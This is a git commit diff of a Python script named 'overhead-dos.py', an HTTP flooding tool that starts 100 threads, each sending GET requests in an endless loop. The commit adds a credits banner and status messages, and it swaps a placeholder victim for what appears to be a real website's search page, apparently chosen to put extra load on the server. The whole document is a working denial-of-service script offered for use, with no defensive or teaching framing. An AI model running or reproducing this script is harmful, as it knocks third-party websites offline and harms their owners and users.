f3ff4726aefcfc6f3764342a1d5d67780fdacccd
Case <c4645843@trbvn.com>
2017-04-29 12:38:11 +0000

    Update overhead-dos.py

--- overhead-dos.py
+++ overhead-dos.py
@@ -2,9 +2,16 @@ import threading
 import requests
 import random
 
-# Special thanks to Woz
-
+WEB = "http://target.com"
 THREADS = 100
+
+art = """
+____ _  _ ____ ____ _  _ ____ ____ ___     ___  ____ ____    ____ ____ ____ _ ___  ___
+|  | |  | |___ |__/ |__| |___ |__| |  \    |  \ |  | [__     [__  |    |__/ | |__]  |
+|__|  \/  |___ |  \ |  | |___ |  | |__/    |__/ |__| ___]    ___] |___ |  \ | |     |
+
+                                                       By Woz, Sh3llm4sk & Case
+"""
 
 def create_threads(threads):
     for _ in range(threads):
@@ -13,11 +20,15 @@ def create_threads(threads):
 
 def work():
     while True:
-        requests.get("http://victimweb.com/")
+        requests.get("http://fnff.es/Buscador.aspx?search=sgtZISsNfC8%3d")
 
 def main():
-    print('Starting attack...')
+    print(art)
+    print('Target: ' + WEB)
+    print('Threads: ' + str(THREADS))
     create_threads(THREADS)
+    print('All threads created!')
+    print('Attacking...')
 
 if __name__ == "__main__":
     main()
